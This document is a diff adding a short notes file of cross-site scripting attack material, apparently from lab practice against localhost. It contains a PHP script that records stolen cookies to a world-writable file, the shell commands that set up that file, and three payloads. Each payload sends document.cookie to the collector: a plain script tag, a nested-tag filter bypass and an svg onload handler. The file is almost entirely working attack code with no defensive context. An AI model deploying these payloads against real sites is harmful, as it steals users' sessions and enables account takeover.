@@ -1,0 +1,19 @@
+http://localhost/xss.php
+touch /home/xss_0.txt
+chmod 777 /home/xss_0.txt
+
+<?php
+$cookie=$_GET[cookie];
+$save_file=fopen("/home/xss_0.txt","w");
+fwrite($save_file, $cookie);
+fclose($save_file);
+?>
+
+3.0
+<script>document.location="localhost?cookie="+document.cookie;</script>
+
+3.1
+<sscriptcript>document.location="localhost?cookie="+document.cookie;</sscriptcript>
+
+3.2
+<svg onload=document.location="localhost?cookie="+document.cookie;>
